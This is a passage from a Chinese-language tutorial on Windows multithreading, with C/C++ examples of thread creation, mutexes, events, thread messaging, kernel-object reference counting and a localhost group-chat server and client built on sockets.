	hThread = CreateThread(NULL, 0, ThreadFun, &m, 0, &dwThreadID);//入口函数的取地址符&，可加可不加
	if (hThread == 0)
	{
		puts("CreateThread() error");
		return -1;
	}
	printf("我是主线程，PID = %d\n", GetCurrentThreadId());
	printf("*****************begin WaitForSingleObject\n");
	//主线程会阻塞在此处，直到等待时间到或子线程执行结束
	if ((wr = WaitForSingleObject(hThread, INFINITE)) == WAIT_FAILED)
	{
		puts("thread wait error\n");
		return -1;
	}
	printf("*****************end WaitForSingleObject\n");
	CloseHandle(hThread);

	Sleep(3000);
	system("pause");//注释后报错，因为主线程已结束，子线程还在继续
	return 0;
}
```

 

🔺第三个例子：起两个线程，一个加+1，一个减1【前面还是单子线程，下面是多线程示例】【线程同步】

```c++
WaitForMultipleObjects(
    _In_ DWORD nCount,    						// 要监测的句柄的组的句柄的个数
    _In_reads_(nCount) CONST HANDLE* lpHandles, //要监测的句柄的组
    _In_ BOOL bWaitAll,  // TRUE等待所有的内核对象发出信号， FALSE 任意一个内核对象发出信号
    _In_ DWORD dwMilliseconds 					//等待时间
);

```

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

#define NUM_THREAD 50
long long num = 0;

DWORD WINAPI ThreadInc(void* p)//LPVOID：void*
{
	int i;
	for (i = 0; i < 500000; i++)
	{
		num += 1;
	}
	return 0;
}
DWORD WINAPI ThreadDec(void* p)
{
	int i;
	for (i = 0; i < 500000; i++)
	{
		num -= 1;
	}
	return 0;
}

int main()
{
	printf("main begin\n");
	HANDLE hHandles[NUM_THREAD];

	int i = 0;
	printf("sizeof(long long):%d\n", sizeof(long long));//8字节
	for (i = 0; i < NUM_THREAD; i++)
	{
		if (i % 2)
			hHandles[i] = CreateThread(NULL, 0, ThreadInc, NULL, 0, NULL);
		else
			hHandles[i] = CreateThread(NULL, 0, ThreadDec, NULL, 0, NULL);
	}

	printf("*****************begin WaitForSingleObject\n");
	//主线程会阻塞在此处，直到等待时间到或子线程执行结束
	WaitForMultipleObjects(NUM_THREAD, hHandles, TRUE, INFINITE);
	printf("num=%d\n", num);
	printf("*****************end WaitForSingleObject\n");

	system("pause");//注释后报错，因为主线程已结束，子线程还在继续
	return 0;
}
```

> 执行结果：没有加入线程，必然没有确定的答案。
>



<br>

## 6.4 线程同步与互斥对象

互斥对象(`mutex`)属于内核对象，它能够确保线程拥有对单个资源的互斥访问权。

互斥对象包含一个使用数量，一个线程ID和一个计数器。其中，线程ID用于标识系统中的哪个线程当前拥有互斥对象，计数器用于指明该线程拥有互斥对象的次数。

- 创建互斥对象：调用函数`CreateMutex`。调用成功，该函数返回所创建的互斥对象的句柄。
-  请求互斥对象所有权：调用函数`WaitForSingleObject`函数。线程必须主动请求共享对象的所有权才能获得所有权。
- 释放指定互斥对象的所有权：调用`ReleaseMutex`函数。线程访问共享资源结束后，线程要主动释放对互斥对象的所有权，使该对象处于已通知状态。

```c++
//CreateMutex
CreateMutexW(
    _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes,   //指向安全属性
    _In_ BOOL bInitialOwner,   //初始化互斥对象的所有者  TRUE 立即拥有互斥体，false表示创建的这个mutex不属于任何线程；所以处于激发状态，也就是有信号状态
    _In_opt_ LPCWSTR lpName    //指向互斥对象名的指针  L“Bingo”，可以默认NULL无名
);
```

示例：在上节代码中添加最简单的PV操作，即`WaitForSingleObject` / `ReleaseMutex` 操作。

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

#define NUM_THREAD 50
long long num = 0;
HANDLE hMutex;

DWORD WINAPI ThreadInc(void* p)//LPVOID：void*
{
	int i;
	WaitForSingleObject(hMutex, INFINITE);
	for (i = 0; i < 500000; i++)
	{
		num += 1;
	}
	ReleaseMutex(hMutex);
	return 0;
}
DWORD WINAPI ThreadDec(void* p)
{
	int i;
	WaitForSingleObject(hMutex, INFINITE);
	for (i = 0; i < 500000; i++)
	{
		num -= 1;
	}
	ReleaseMutex(hMutex);
	return 0;
}

int main()
{
	printf("main begin\n");
	HANDLE hHandles[NUM_THREAD];

	//创建互斥量
	hMutex = CreateMutexW(NULL, FALSE, NULL);
	int i = 0;

	printf("sizeof(long long):%d\n", sizeof(long long));//8字节
	for (i = 0; i < NUM_THREAD; i++)
	{
		if (i % 2)
			hHandles[i] = CreateThread(NULL, 0, ThreadInc, NULL, 0, NULL);
		else
			hHandles[i] = CreateThread(NULL, 0, ThreadDec, NULL, 0, NULL);
	}

	printf("*****************begin WaitForSingleObject\n");
	//主线程会阻塞在此处，直到等待时间到或子线程执行结束
	WaitForMultipleObjects(NUM_THREAD, hHandles, TRUE, INFINITE);
	printf("num=%d\n", num);
	printf("*****************end WaitForSingleObject\n");

	system("pause");//注释后报错，因为主线程已结束，子线程还在继续
	return 0;
}
```

注意：此处的`WaitForSingleObject` 等待的是互斥量的内核对象；上节等待的线程的内核对象。



<br>

## 6.5 线程间通信

### 6.5.1 消息队列

`PostThreadMessage`是一个Windows API函数，用于向指定线程的消息队列中发送一个消息。

```c++
// PostThreadMessage的函数原型
BOOL PostThreadMessage(
  DWORD  idThread,	//要发送消息的目标线程的ID。
  UINT   Msg,		//要发送的消息类型。
  WPARAM wParam,	//消息的附加参数。
  LPARAM lParam		//消息的附加参数。
);
```

`PostThreadMessage`函数将消息发送到指定线程的消息队列中，然后立即返回。线程可以通过调用`GetMessage`或`PeekMessage`函数来获取并处理该消息。该函数通常用于线程间的通信，可以用来传递自定义消息或系统消息，从而实现线程之间的协作和信息交换。

**示例：**演示如何使用`PostThreadMessage`向另一个线程发送消息。

在上述示例中，我们创建了一个新的线程，并通过`CreateThread`函数启动。然后，我们使用`PostThreadMessage`函数向该线程发送一个自定义消息（`WM_USER`）。在线程的消息循环中，我们通过`GetMessage`函数获取消息并进行处理。在本例中，我们判断接收到的消息是否为自定义消息`WM_USER`，并进行相应的处理。然后，我们等待线程结束并关闭线程句柄。

> 请注意，上述示例中的线程函数`ThreadProc`是一个简单的消息循环，用于处理线程收到的消息。在实际应用中，您可能需要根据需要自定义消息处理过程。

```cpp
#include <windows.h>
#include <iostream>
 
DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    MSG msg;
    HWND hWnd = (HWND)lpParam;
 
    // 等待消息循环
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (msg.message == WM_USER)
        {
            std::cout << "Received custom message." << std::endl;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
 
    return 0;
}
 
int main()
{
    // 创建一个新线程
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, &threadId);
    if (hThread == NULL)
    {
        std::cout << "Failed to create thread." << std::endl;
        return 1;
    }
 
    // 等待一段时间
    Sleep(1000);
 
    // 向线程发送消息
    if (!PostThreadMessage(threadId, WM_USER, 0, 0))
    {
        std::cout << "Failed to post thread message." << std::endl;
        return 1;
    }
 
    // 等待线程结束
    WaitForSingleObject(hThread, INFINITE);
 
    // 关闭线程句柄
    CloseHandle(hThread);
 
    return 0;
}
```



<br>

### 6.5.2 事件

前面说的互斥量`Mutex`与关键段`CriticalSection`都不能实现线程的同步，只能实现互斥，接下来我们用时间event就可以实现**线程的同步**了，事件也是一个内核对象。

**相关函数说明**

1. 创建事件

   ```cpp
   HANDLE WINAPI CreateEventW(
   			    _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
   			    _In_ BOOL bManualReset,
   			    _In_ BOOL bInitialState,
   			    _In_opt_ LPCWSTR lpName
   			    );
   //- 第一个参数表示安全控制，一般直接传入NULL。
   //- 第二个参数确定事件是手动置位还是自动置位，传入TRUE表示手动置位，传入FALSE表示自动置位。如果为自动置位，则对该事件调用WaitForSingleObject()后会自动调用ResetEvent()使事件变成未触发状态。
   //- 第三个参数表示事件的初始状态，传入TRUR表示已触发。
   //- 第四个参数表示事件的名称，传入NULL表示匿名事件。
   ```

   

2. 打开事件

   ```cpp
   HANDLE WINAPI OpenEventW(
   			    _In_ DWORD  dwDesiredAccess,
   			    _In_ BOOL  bInheritHandle,
   			    _In_ LPCWSTR  lpName
   			    );
   //- 第一个参数表示访问权限，对事件一般传入EVENT_ALL_ACCESS。
   //- 第二个参数表示事件句柄继承性，一般传入TRUE即可。
   //- 第三个参数表示名称，不同进程中的各线程可以通过名称来确保它们访问同一个事件。
   ```

   

3. 触发事件

   ```cpp
   BOOL WINAPI SetEvent(
   			  _In_ HANDLE hEvent
   			);
   //- 函数说明：每次触发后，必有一个或多个处于等待状态下的线程变成可调度状态。
   //- hEvent 为要触发的事件的句柄(内核对象)
   ```

   

4. 将事件设为末触发

   ```cpp
   BOOL WINAPI ResetEvent(
   			  _In_ HANDLE hEvent
   			);
   // hEvent 为要触发的事件的句柄(内核对象)
   ```

   

**实例**

前面我们用关键段和互斥量无法实现线程同步，在前面的程序中，我们可以实现对全局资源互斥访问，即每个线程给全局资源加一，现在使用事件可以实现线程同步，即实现每个线程按顺序依次给全局资源加一，代码如下:

```c++
//使用事件进行线程同步
#include<iostream>
#include <windows.h>

using namespace std;

CRITICAL_SECTION g_csVar;
HANDLE g_event;
const int THREAD_NUM = 10;
int g_Num = 0;

DWORD WINAPI  Func(LPVOID);


int main()
{
	g_event = CreateEvent(NULL, false, false, NULL);	// 初始化事件为未触发状态
	InitializeCriticalSection(&g_csVar);
	DWORD  ThreadId[THREAD_NUM];
	HANDLE handle[THREAD_NUM];
	int i = 0;
	while (i < THREAD_NUM)
	{
		handle[i] = CreateThread(NULL, 0, Func, &i, 0, &ThreadId[i]);
		WaitForSingleObject(g_event, INFINITE);	//等待事件被触发
		i++;
	}
	WaitForMultipleObjects(THREAD_NUM, handle, TRUE, INFINITE);

	CloseHandle(g_event);
	DeleteCriticalSection(&g_csVar);
	return 0;
}


DWORD WINAPI Func(LPVOID p)
{
	int nThreadNum = *(int*)p;
	
	EnterCriticalSection(&g_csVar);
	cout << "线程编号为：" << nThreadNum << " 给全局资源g_Num 加1，现在给全局资源g_Num值为：" << ++g_Num << endl;
	LeaveCriticalSection(&g_csVar);
	SetEvent(g_event);	//触发事件
	return 0;
}
```





<br>

## 6.6 多线程实现QQ群聊

📋服务端

- 多线程 + socket编程
- 用互斥体进行线程同步   临界区  全局变量

📋服务端的设计：

1. 每来一个连接，服务端起一个线程维护
2. 将收到的消息转发给所有的客户端
3. 某个连接断开，需要处理断开的连接

```c++
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <process.h>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

#define MAX_THREAD 256
#define MAX_BUFF_SIZE 1024

SOCKET cntSockets[MAX_THREAD];//所有连接的客户端socket
int cntCOUNT = 0;//客户端数量

HANDLE hMutex;

// 服务端的设计：
// 1 每来一个连接，服务端起一个线程（安排一个工人）维护
// 2 将收到的消息转发给所有的客户端
// 3 某个连接断开，需要处理断开的连接

unsigned WINAPI ThreadFUNC(void*);
void SendMsg(char*, int);
void ErrorHandling(const char* message, int ERRNO);
int getCurrentTimeStr(char* strtime);

int main()
{
	printf("Server begin:\n");
	//加载套接字库
	WORD wVersionRequested;
	WSADATA wsaData;

	wVersionRequested = MAKEWORD(1, 1);
	// 初始化套接字库
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		//return err;
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}


	//2 创建套接字
	SOCKET hServerSock = socket(AF_INET, SOCK_STREAM, 0);
	if (hServerSock == INVALID_SOCKET)
	{
		ErrorHandling("Creat socket ERROR", WSAGetLastError());
	}

	SOCKADDR_IN addrServ;
	int szAddrServ = sizeof(addrServ);
	memset(&addrServ, 0, szAddrServ);

	addrServ.sin_family = PF_INET;
	addrServ.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServ.sin_port = htons(7000);

	//绑定
	if (SOCKET_ERROR == bind(hServerSock, (sockaddr*)&addrServ, szAddrServ))
	{
		ErrorHandling("bind ERROR", WSAGetLastError());
	}
	//监听
	if (SOCKET_ERROR == listen(hServerSock, 5))
	{
		ErrorHandling("listen ERROR", WSAGetLastError());
	}
	printf("Begin Listen:\n");


	HANDLE hThread;
	hMutex = CreateMutexW(NULL, FALSE, NULL);//创建互斥量

	SOCKADDR_IN addrCnt;
	int szAddrCnt = sizeof(SOCKADDR_IN);

	while (1)
	{
		SOCKET clientSock = accept(hServerSock, (SOCKADDR*)&addrCnt, &szAddrCnt);
		if (SOCKET_ERROR == clientSock)
		{
			ErrorHandling("accept ERROR", WSAGetLastError());
		}
		WaitForSingleObject(hMutex, INFINITE);
		cntSockets[cntCOUNT++] = clientSock;
		ReleaseMutex(hMutex);

		hThread = (HANDLE)_beginthreadex(NULL, 0, ThreadFUNC, (void*)&clientSock, 0, NULL);
		printf("Connect client IP: %s \n", inet_ntoa(addrCnt.sin_addr));
		printf("Connect client num: %d \n", cntCOUNT);
	}
	closesocket(hServerSock);
	WSACleanup();

	system("pause");
	return 0;
}


unsigned WINAPI ThreadFUNC(void* arg)
{
	SOCKET clientSock = *(SOCKET*)(arg);
	char szMsg[MAX_BUFF_SIZE] = {};
	int iLen = 0, i;

	while (true)
	{
		iLen = recv(clientSock, szMsg, sizeof(szMsg), 0);
		if (iLen != -1)
		{
			//将收到的消息转发给其他客户端
			SendMsg(szMsg, iLen);
		}
		else
		{
			break;
		}
	}
	//处理客户端下线：因为用数组来表示客户端组，故有client离开时需要将后面的全部前移
	WaitForSingleObject(hMutex, INFINITE);
	printf("Current Connect NUM: %d", cntCOUNT);
	//1 遍历找出下线client
	for (i = 0; i < cntCOUNT; i++)
	{
		if (cntSockets[i] == clientSock)
		{
			//2 移动数组
			while (i++ < cntCOUNT)
			{
				cntSockets[i-1] = cntSockets[i];
			}
			break;
		}
	}
	//3 count-1
	cntCOUNT--;
	printf("Current Connect NUM: %d", cntCOUNT);
	ReleaseMutex(hMutex);
	//4 close
	closesocket(clientSock);
	return 0;
}

void SendMsg(char* message, int len)
{
	WaitForSingleObject(hMutex, INFINITE);
	for (int i = 0; i < cntCOUNT; i++)
	{
		send(cntSockets[i], message, len, 0);
	}
	ReleaseMutex(hMutex);
}

int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}

void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}
```



📋客户端

1. 请求上线
2. 发消息：等待用户从控制台输入，然后发送到服务端
3. 客户端等待服务器消息，收完数据后输出控制台
4. 等待用户关闭客户端【Q表示退出】

其中，收发消息需要两个线程

- 接收服务端的消息：一个线程接收消息
- 发送消息给服务端：一个线程发送消息

```c++
#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <process.h>
#include <iostream>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable:4996)

#define MAX_NameSize 256
#define MAX_BUFF_SIZE 1024

char szName[MAX_NameSize] = "[DEFAULT]";//上线名称
char szMsg[MAX_BUFF_SIZE];//buffer

// 客户端的设计：
//1. 请求上线
//2. 发消息：等待用户从控制台输入
//3. 客户端等待服务器消息
//4. 等待用户关闭【Q表示退出】

unsigned WINAPI SendThreadFUNC(void*);
unsigned WINAPI RecvThreadFUNC(void*);
void ErrorHandling(const char* message, int ERRNO);
int getCurrentTimeStr(char* strtime);

int main(int argc, char* argv[])
{
	printf("dddddddddddddddddddddddddd:\n");
	if (argc < 2)
	{
		puts("Must input two args[Start in CMD]\n");
		system("pause");
		exit(-1);
	}
	else
	{
		//szName = arg[1];//注意下面的写法
		std::cout << "Welcome " << argv[1]<<"!" << std::endl;
		sprintf(szName, "[%s]", argv[1]);
	}
	printf("Client begin:\n");

	//加载套接字库
	WORD wVersionRequested;
	WSADATA wsaData;

	wVersionRequested = MAKEWORD(1, 1);
	// 初始化套接字库
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		//return err;
		ErrorHandling("WSAStartup() error!", WSAGetLastError());
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return -1;
	}

	//2 创建套接字
	SOCKET hSock = socket(AF_INET, SOCK_STREAM, 0);
	if (hSock == INVALID_SOCKET)
	{
		ErrorHandling("Create socket ERROR", WSAGetLastError());
	}

	SOCKADDR_IN addrCnt;
	int szAddrClient = sizeof(addrCnt);
	memset(&addrCnt, 0, szAddrClient);

	addrCnt.sin_family = PF_INET;
	addrCnt.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	addrCnt.sin_port = htons(7000);

	//3 connect 连接服务器
	if (SOCKET_ERROR == connect(hSock, (SOCKADDR*)&addrCnt, szAddrClient))
	{
		ErrorHandling("Connect ERROE", WSAGetLastError());
	}
	printf("Begin Send and Recv:\n");

	//4 创建线程处理收发消息
	HANDLE SendThread, RecvThread;
	SendThread = (HANDLE)_beginthreadex(NULL, 0, SendThreadFUNC, (void*)&hSock, 0, NULL);
	RecvThread = (HANDLE)_beginthreadex(NULL, 0, RecvThreadFUNC, (void*)&hSock, 0, NULL);

	//5 等待线程执行结束
	WaitForSingleObject(SendThread, INFINITE);
	WaitForSingleObject(RecvThread, INFINITE);

	closesocket(hSock);
	WSACleanup();

	system("pause");
	return 0;
}


unsigned WINAPI SendThreadFUNC(void* arg)
{
	SOCKET hSock = *(SOCKET*)(arg);
	char szNameMsg[MAX_NameSize + MAX_BUFF_SIZE + 1] = {};//Name : Message
	int iLen = 0;

	while (true)
	{
		memset(szMsg, 0, MAX_BUFF_SIZE);
		memset(szNameMsg, 0, MAX_NameSize + MAX_BUFF_SIZE + 1);
		// 阻塞并等待输入消息
		//scanf("%s\n", szMsg);//报错
		fgets(szMsg, MAX_BUFF_SIZE, stdin);//错误：无法终止输入

		// 退出机制
		if (!strcmp(szMsg, "q\n") || !strcmp(szMsg, "Q\n"))
		{
			fputs("Client Down\n", stdout);
			closesocket(hSock);
			break;
		}
		//拼包发送
		sprintf(szNameMsg, "%s:%s", szName, szMsg);
		iLen=send(hSock, szNameMsg, (int)strlen(szNameMsg), 0);
		printf("send %d!\n", iLen);
	}
	return 0;
}

unsigned WINAPI RecvThreadFUNC(void* arg)
{
	SOCKET hSock = *(SOCKET*)(arg);
	char szNameMsg[MAX_NameSize + MAX_BUFF_SIZE + 1] = {};//Name : Message
	int iLen = 0;

	while (true)
	{
		memset(szNameMsg, 0, MAX_NameSize + MAX_BUFF_SIZE + 1);
		//阻塞并等待服务器消息
		iLen = recv(hSock, szNameMsg, MAX_NameSize + MAX_BUFF_SIZE + 1, 0);
		if (iLen == -1)
		{
			fputs("recv stop!\n", stdout);
			return 2;
		}
		fputs(szNameMsg, stdout);
	}
	return 0;
}

int getCurrentTimeStr(char* strtime)
{
	// 基于当前系统的当前日期/时间
	time_t now = time(NULL);
	tm* ltm = localtime(&now);
	sprintf(strtime, "%2d:%2d:%2d", ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
	return 0;
}

void ErrorHandling(const char* message, int ERRNO)
{
	fputs(message, stderr);
	fputc('\n', stderr);
	char ch[64];
	getCurrentTimeStr(ch);
	//printf("Error num = %d, Error time %s\n", ::GetLastError(), ch);
	printf("Error num = %d, Error time %s\n", ERRNO, ch);
	system("pause");
	exit(-1);
}
```

**注意**：`main`函数的定义：`int main(int argc, char* argv[])`



<br>

# 七 线程同步

## 7.1 线程同步之事件对象

事件对象也属于内核对象，它包含以下三个成员：

- 使用计数；
- 用于指明该事件是一个自动重置的事件还是一个人工重置的事件的布尔值；
- 用于指明该事件处于已通知状态还是未通知状态的布尔值。

事件对象有两种类型：人工重置的事件对象和自动重置的事件对象。这两种事件对象的区别在于：

- 当人工重置的事件对象得到通知时，等待该事件对象的**所有线程**均变为可调度线程；
- 而当一个自动重置的事件对象得到通知时，等待该事件对象的线程中**只有一个线程**变为可调度线程。

<br>

🔺1、<span style="background:#5de420;">创建事件对象</span>：调用`CreateEvent`函数创建或打开一个命名的或匿名的事件对象。

🔺2、<span style="background:#5de420;">设置事件对象状态</span>：调用`SetEvent`函数把指定的事件对象设置为有信号状态。

🔺3、<span style="background:#5de420;">重置事件对象状态</span>：调用`ResetEvent`函数把指定的事件对象设置为无信号状态。

🔺4、<span style="background:#5de420;">请求事件对象</span>：线程通过调用`WaitForSingleObject`函数请求事件对象。

`CreateEvent`函数原型如下：

```c++
HANDLE CreateEvent( 　　
    LPSECURITY_ATTRIBUTES lpEventAttributes, // 安全属性 　　
    BOOL bManualReset,// 复位方式:TRUE 必须用ResetEvent手动复原  FALSE 自动还原为无信号状态
    BOOL bInitialState,// 初始状态:TRUE 初始状态为有信号状态  FALSE 无信号状态
    LPCTSTR lpName //对象名称:NULL  无名的事件对象
);
```



**案例一：**

- 输入一个全局字串：`ABCD`或`AAADDD`。
- 要求：通过多线程的方式来判断有几个字母A，必须用线程同步【事件对象】的方式实现。
- 实现两个线程的顺序同步，表现在控制线程`NumberOfother`先于线程`NumberOfA`

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

//- 输入一个全局字串：`ABCD`或`AAADDD`
//- 要求：通过多线程的方式来判断有几个字母A
//- 使用线程同步【事件对象】的方式实现：两个线程的顺序同步
char str[100]{ 0 };
HANDLE hEvent;//事件对象

unsigned WINAPI NumberOfA(void* arg);
unsigned WINAPI NumberOfother(void* arg);

int main()
{
	fputs("Input string:", stdout);
	fgets(str, 100, stdin);

	//1 创建事件对象:
	hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);//手动复位 初始无信号状态

	//两个线程同时操作全局变量，必然需要同步
	HANDLE hThreadOfA, hThreadOfother;
	hThreadOfA = (HANDLE)_beginthreadex(NULL, 0, NumberOfA, NULL, 0, NULL);
	hThreadOfother = (HANDLE)_beginthreadex(NULL, 0, NumberOfother, NULL, 0, NULL);

	//两个线程执行结束后，将事件对象设置为无信号状态
	WaitForSingleObject(hThreadOfA, INFINITE);
	WaitForSingleObject(hThreadOfother, INFINITE);
	ResetEvent(hEvent);
	CloseHandle(hEvent);
	
	system("pause");
	return 0;
}

unsigned WINAPI NumberOfA(void* arg)
{
	int i, cnt = 0;
	//阻塞等待
	WaitForSingleObject(hEvent,INFINITE);

	for (i = 0; str[i] != 0; i++)
	{
		if (str[i] == 'A')
		{
			cnt++;
		}
	}
	printf("Number of A = %d\n", cnt);
	return 0;
}

unsigned WINAPI NumberOfother(void* arg)
{
	int i, cnt = 0;
	//阻塞等待
	//WaitForSingleObject(hEvent, INFINITE);

	for (i = 0; str[i] != 0; i++)
	{
		if (str[i] != 'A')
		{
			cnt++;
		}
	}
	printf("Number of Others = %d\n", --cnt);//去除字符串末尾
	//设置事件对象为有信号状态
	SetEvent(hEvent);
	return 0;
}
```



**案例二：窗口卖票**

- 两个窗口买票，要求两个窗口不重复买票
- 要求：通过多线程的方式和线程同步【事件对象】的方式实现。

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>

int iTickets = 100;
HANDLE g_hEvent;//事件对象

unsigned long WINAPI SellTicketA(void* arg);
unsigned long WINAPI SellTicketB(void* arg);

int main()
{
	fputs("Sell tickets:\n", stdout);

	HANDLE hThreadA, hThreadB;
	hThreadA = CreateThread(NULL, 0, SellTicketA, NULL, 0, 0);
	hThreadB = CreateThread(NULL, 0, SellTicketB, NULL, 0, 0);

	fputs("DDDDDDDDDDDDDDDDDDDDDDDDDDD\n", stdout);
	/*CloseHandle(hThreadA);
	CloseHandle(hThreadB);*/

	g_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);//自动复位为无信号 初始无信号
	SetEvent(g_hEvent);//设置为有信号
	//Sleep(4000);
	WaitForSingleObject(hThreadA, INFINITE);
	WaitForSingleObject(hThreadB, INFINITE);
	CloseHandle(g_hEvent);

	system("pause");
	return 0;

}

unsigned long WINAPI SellTicketA(void* arg)
{
	while (1)
	{
		WaitForSingleObject(g_hEvent, INFINITE);
		if (iTickets > 0)
		{
			Sleep(1);
			iTickets--;
			printf("A remain %d\n", iTickets);
		}
		else
		{
			fputs("No remain ticket!\n", stdout);
			break;
		}
		SetEvent(g_hEvent);
	}
	return 0;

}

unsigned long WINAPI SellTicketB(void* arg)
{
	while (1)
	{
		WaitForSingleObject(g_hEvent, INFINITE);
		if (iTickets > 0)
		{
			Sleep(1);
			iTickets--;
			printf("B remain %d\n", iTickets);
		}
		else
		{
			fputs("No remain ticket!\n", stdout);
			break;
		}
		SetEvent(g_hEvent);
	}
	return 0;//0  内核对象被销毁

}
```



<br>

## 7.2 深入理解windows内核对象与句柄

### 7.2.1 内核对象

- Windows中每个内核对象都只是一个<span style="background:#5de420;">内存块</span>，它由操作系统内核分配，并只能由操作系统内核进行访问，应用程序不能在内存中定位这些数据结构并直接更改其内容。
- 这个内存块是一个数据结构，其成员维护着与对象相关的信息。
- 少数成员【安全描述符`lpAttributes`和使用计数】是所有内核对象都有的，但大多数成员都是不同类型对象特有的。

CreateFile 类型如下：`file`文件对象、`event`事件对象、`process`进程、`thread`线程、`iocompletationport`完成端口【windows服务器】、`mailslot`邮槽、`mutex`互斥量和 `registry`注册表 等。



### 7.2.2 内核对象的使用计数与生命周期

- 内核对象的所有者是操作系统内核，而非进程。换言之也就是说，当进程退出，内核对象不一定会销毁。
- 操作系统内核通过内核对象的<span style="background:#5de420;">使用计数</span>，知道当前有多少个进程正在使用一个特定的内核对象。
  - 初次创建内核对象，使用计数为1。
  - 当另一个进程获得该内核对象的访问权之后，使用计数加1。
  - 如果内核对象的使用计数递减为0，操作系统内核就会销毁该内核对象。
- 也就是说内核对象在当前进程中创建，但是当前进程退出时，内核对象有可能被另外一个进程访问。这时，进程退出只会减少**当前进程**对引用的所有内核对象的使用计数，而不会减少**其他进程**对内核对象的使用计数（即使该内核对象由当前进程创建）。那么内核对象的使用计数未递减为0，操作系统内核不会销毁该内核对象。

![](W-7-1.png)

1. 【进程1退出，2不退出时】内核对象A、B的引用计数减为0，被操作系统内核销毁。而进程1只减少自身对C、D的引用计数，不会影响进程2对C、D的引用计数，故此时C、D引用计数不为0，不会被销毁。
2. 【进程2退出，1不退出时】进程2减少自身对C、D的引用计数，不会影响进程1，故A、B、C、D都不会被销毁
3. 【进程1、2均退出时】只要ABCD不被别的进程使用，内核对象A、B、C、D的引用计数均递减为0，被内核销毁



### 7.2.3 操作内核对象

Windows提供了一组函数进行操作内核对象。

- 成功调用一个创建内核对象的函数后，会返回一个句柄，它表示了所创建的内核对象，可由进程中的任何线程使用。
- 在32位进程中，句柄是一个32位值，在64位进程中句柄是一个64位值。我们可以使用唯一标识内核对象的句柄，调用内核操作函数对内核对象进行操作。



### 7.2.4 内核对象与其他类型的对象

Windows进程中除了内核对象还有其他类型的对象，比如窗口，菜单，字体等，这些属于用户对象和GDI对象。

要区分内核对象与非内核对象，最简单的方式就是查看创建这个对象的函数，几乎所有创建内核对象的函数都有一个允许我们指定<span style="background:#5de420;">安全属性</span>的参数。

 

### 7.2.5 注意与补充

1. 一个对象是不是内核对象，通常可以看创建此对象`API`的参数中是否需要：`PSECURITY_ATTRIBUTES` 类型的参数。

2.  内核对象只是一个内存块，这块内存位于操作系统内核的地址空间，内存块中存放一个数据结构【此数据结构的成员有如：安全描述符、使用计数等】

3. 每个进程中有一个句柄表【handle table】，这个句柄表仅供内核对象使用，如下图：

   ![img](W-7-2.png)

4. 调用 `hThread = CreateThread(... , &threadId);` ：当调用了`CreateThread` 、`CreateFile` 等创建内核对象的函数后，就是相当于操作系统多了一个内存块，这个内存块就是内核对象。

   - 此时，内核对象被创建，其数据结构中的引用计数初始为1【这样理解：只要内核对象被创建，其引用计数被初始化为1】。这里实则会发生两件事：创建了一个内核对象和创建线程的函数打开【访问】了此对象，所以内核对象的引用计数加1，这时引用计数就为2了。
   - 调用API `CreateThread `的时候，不仅仅是创建了一个内核对象，引用计数+1，还打开了内核对象+1，所以引用计数变为2
   - 当调用`CloseHandle(hThread);` 时发生这样的事情：系统通过`hThread`计算出此句柄在句柄表中的索引，然后把那一项处理后标注为空闲可用的项，内核对象的引用计数减1，即此时此内核对象的引用计数为1，之后这个线程句柄与创建时产生的内核对象已经没有任何关系了【即不能通过hThread句柄去访问内核对象了】
   - 只有当内核对象的引用计数为0时，内核对象才会被销毁，而此时它的引用计数为1，那它什么时候会被销毁？【当此线程结束的时候，它的引用计数再减1即为0，内核对象被销毁】

此时又有一个新问题产生：我们已经关闭了线程句柄，也就是这个线程句柄已经和内核对象没有瓜葛了，那么那个内核对象是怎么又可以和此线程联系起来了呢？ 其实是创建线程时产生的那个线程ID，代码如下：

```c++
#include <stdio.h>
#include <windows.h>
#include <WinBase.h>

DWORD WINAPI ThreadProc(LPVOID lpParameter)
{
	printf("I am comming...");
	while (1) {}
	return 0;
}

int main()
{
	HANDLE hThread;
	HANDLE headle2;
	DWORD threadId;

	hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, &threadId);//引用计数=2
	CloseHandle(hThread);  //  关闭了线程句柄，引用计数=1
	//可以通过线程ID来再次访问并返回句柄handle
	headle2 = OpenThread(THREAD_QUERY_INFORMATION, FALSE, threadId);
	headle2 = OpenThread(THREAD_QUERY_INFORMATION, FALSE, threadId);
	headle2 = OpenThread(THREAD_QUERY_INFORMATION, FALSE, threadId);

	return 0;
}
```



<br>

## 7.3 线程同步之信号量

> 较难，相比于其他线程同步方式用的较少

内核对象的状态：

